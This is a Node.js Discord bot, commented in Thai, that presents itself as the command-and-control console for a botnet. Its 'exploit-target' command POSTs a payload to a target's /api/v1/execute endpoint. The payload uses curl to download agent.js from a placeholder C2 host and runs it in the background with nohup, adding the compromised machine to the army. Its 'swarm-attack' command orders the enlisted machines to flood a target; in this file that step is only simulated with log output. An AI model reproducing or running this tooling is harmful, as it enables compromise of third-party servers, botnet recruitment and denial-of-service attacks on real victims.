const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const axios = require('axios');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// เก็บรายชื่อเครื่องทาสที่รายงานตัวเข้ามาในระบบ
let slaveNodes = [];

client.once('ready', async () => {
    console.log(`[+] C2 Discord Bot logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('swarm-attack')
            .setDescription('สั่งการกองทัพเครื่องทาสทั้งหมดรุมยิงเป้าหมายพร้อมกัน!')
            .addStringOption(option =>
                option.setName('target')
                    .setDescription('URL หรือ IP เป้าหมายที่ต้องการถล่ม')
                    .setRequired(true))
            .addIntegerOption(option =>
                option.setName('duration')
                    .setDescription('ระยะเวลาในการยิง (วินาที)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('nodes-status')
            .setDescription('ตรวจสอบจำนวนกองทัพเครื่องทาสที่ออนไลน์อยู่ตอนนี้'),
        new SlashCommandBuilder()
            .setName('exploit-target')
            .setDescription('ส่งคำสั่งเจาะช่องโหว่เป้าหมายเพื่อเพิ่มเครื่องทาสเข้ากองทัพ')
            .addStringOption(option =>
                option.setName('target-url')
                    .setDescription('URL เป้าหมายที่มีช่องโหว่')
                    .setRequired(true))
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('[+] C2 Slash commands registered successfully.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    // 1. คำสั่งตรวจสอบกองทัพทาส
    if (interaction.commandName === 'nodes-status') {
        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาสที่เชื่อมต่ออยู่: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
    }

    // 2. คำสั่งสั่งกองทัพรุมยิงเป้าหมาย
    if (interaction.commandName === 'swarm-attack') {
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (slaveNodes.length === 0) {
            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ! ไปหาเหยื่อมาก่อนไอ้น้อง!', ephemeral: true });
        }

        await interaction.reply(`[🔥⚡] ส่งสัญญาณคำสั่งไปยังกองทัพ ${slaveNodes.length} เครื่อง เพื่อรุมถล่ม ${target} เป็นเวลา ${duration} วินาทีแล้ว!`);

        // จำลองการส่งคำสั่งไปให้เครื่องทาสทั้งหมดรุมยิง
        slaveNodes.forEach(node => {
            // ในระบบจริงตรงนี้จะเป็นการส่ง HTTP Request หรือ Socket ไปบอก Agent แต่ละตัว
            console.log(`[>>] สั่งการ Agent ID: ${node.id} ให้ถล่ม ${target}`);
        });
    }

    // 3. คำสั่งสั่งเจาะช่องโหว่เป้าหมายเพิ่มกองทัพ
    if (interaction.commandName === 'exploit-target') {
        let targetUrl = interaction.options.getString('target-url');
        await interaction.reply(`[!] กำลังส่งโค้ดเจาะช่องโหว่ใส่เป้าหมาย ${targetUrl} เพื่อดึงเข้ากองทัพ...`);

        try {
            const vulnerabilityEndpoint = `${targetUrl}/api/v1/execute`;
            const payloadCommand = `cd /tmp && curl -O http://your-c2-server-ip:3000/agent.js && nohup node agent.js > /dev/null 2>&1 &`;

            const response = await axios.post(vulnerabilityEndpoint, { command: payloadCommand }, { timeout: 4000 });

            if (response.status === 200) {
                // จำลองว่าเมื่อเจาะสำเร็จ เครื่องเหยื่อจะรายงานตัวเพิ่มเข้ามาในลิสต์
                const newAgentId = 'agent_' + Math.random().toString(36).substring(7);
                slaveNodes.push({ id: newAgentId, ip: targetUrl });
                await interaction.followUp(`[+] สำเร็จ! เจาะและดึงเครื่อง ${targetUrl} เข้าสู่กองทัพเรียบร้อย! ตอนนี้มี ${slaveNodes.length} เครื่องแล้ว!`);
            } else {
                await interaction.followUp(`[-] เป้าหมาย ${targetUrl} ป้องกันแน่นหนา เจาะไม่เข้า!`);
            }
        } catch (err) {
            await interaction.followUp(`[-] เกิดข้อผิดพลาดในการเจาะเป้าหมาย ${targetUrl}: ${err.message}`);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
